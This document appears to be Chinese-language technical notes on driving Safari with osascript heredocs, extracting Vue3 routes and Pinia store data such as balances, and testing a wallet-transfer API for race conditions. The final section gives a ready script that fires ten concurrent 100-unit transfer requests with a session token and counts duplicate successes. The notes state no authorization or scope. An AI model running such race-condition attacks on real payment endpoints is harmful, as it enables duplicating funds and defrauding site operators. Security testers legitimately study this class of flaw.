# osascript Heredoc模式

当JS代码较长或包含特殊字符时，用heredoc避免转义地狱：

```bash
# 方法1: heredoc（推荐用于复杂脚本）
osascript << 'EOF'
tell application "Safari"
  set jsResult to do JavaScript "
    (function() {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', '/api/User/GetUserInfo', false);
      xhr.send();
      return xhr.responseText;
    })()
  " in current tab of window 1
  return jsResult
end tell
EOF
```

```bash
# 方法2: 写JS到文件再执行（用于非常长的脚本）
cat > /tmp/test.js << 'ENDJS'
(function() {
  var results = {};
  // ... 长脚本
  document.title = JSON.stringify(results);
})();
ENDJS
JS=$(cat /tmp/test.js)
osascript -e "tell application \"Safari\" to do JavaScript \"$JS\" in current tab of window 1"
```

**注意**: osascript中的双引号需要正确匹配。如果JS包含双引号，用单引号包裹JS字符串或用heredoc。

# Vue3路由和Store逆向

## 路由发现

```javascript
// 获取所有路由（包括懒加载的chunk文件名）
var app = document.querySelector('#app').__vue_app__;
var router = app.config.globalProperties.$router;
var routes = router.getRoutes().map(r => ({path: r.path, name: r.name}));
// 返回所有路由路径，包括 /quotaConversion, /withdraw 等
```

## 懒加载组件逆向

Vue3+Vite的路由使用动态import：
```javascript
// 在主bundle中找到：
{path: "/quotaConversion", name: "quotaConversion", 
 component: () => import("./QuotaConversion-82bfed858eff532327c3.js")}
```

要找到特定页面的API调用参数：
1. 从主bundle找到路由表中的chunk文件名
2. 用`fetch('/m/static/assets/js/{chunk}.js')`下载
3. 搜索API函数调用（如`TransferOperate`附近的参数构建）

## Pinia Store逆向

```javascript
var app = document.querySelector('#app').__vue_app__;
var pinia = app.config.globalProperties.$pinia;
var stores = pinia._s;

// 列出所有store
var storeNames = [...stores.keys()];

// 获取user store的方法
var userStore = stores.get('user');
var methods = Object.keys(userStore).filter(k => typeof userStore[k] === 'function');

// 获取globalStore的余额相关属性
var globalStore = stores.get('globalStore');
var balanceProps = {};
for (var key of Object.keys(globalStore)) {
  if (typeof globalStore[key] === 'number') balanceProps[key] = globalStore[key];
}
```

# 竞态条件fire-and-forget模式

当osascript不支持async/Promise时，用fire-and-forget：

```javascript
// 第一个osascript: 发射请求
window._raceResults = {done: 0, results: []};
for (var i = 0; i < 10; i++) {
  var formData = new FormData();
  formData.append('transfer_amt', '100');
  formData.append('OUT_INT_IDENT_CD', 'my_wallet');
  formData.append('IN_INT_IDENT_CD', 'ag_live');
  
  fetch('/api/User/TransferOperate', {
    method: 'POST',
    headers: {'Token': token, 'platform-ident': 'uu'},
    body: formData
  }).then(r => r.text()).then(t => {
    window._raceResults.results.push(decrypt(t));
    window._raceResults.done++;
  });
}

// 第二个osascript (sleep 5后): 读取结果
var r = window._raceResults;
var success = r.results.filter(x => x.state === 'success').length;
// 如果success > 1，存在竞态条件
```
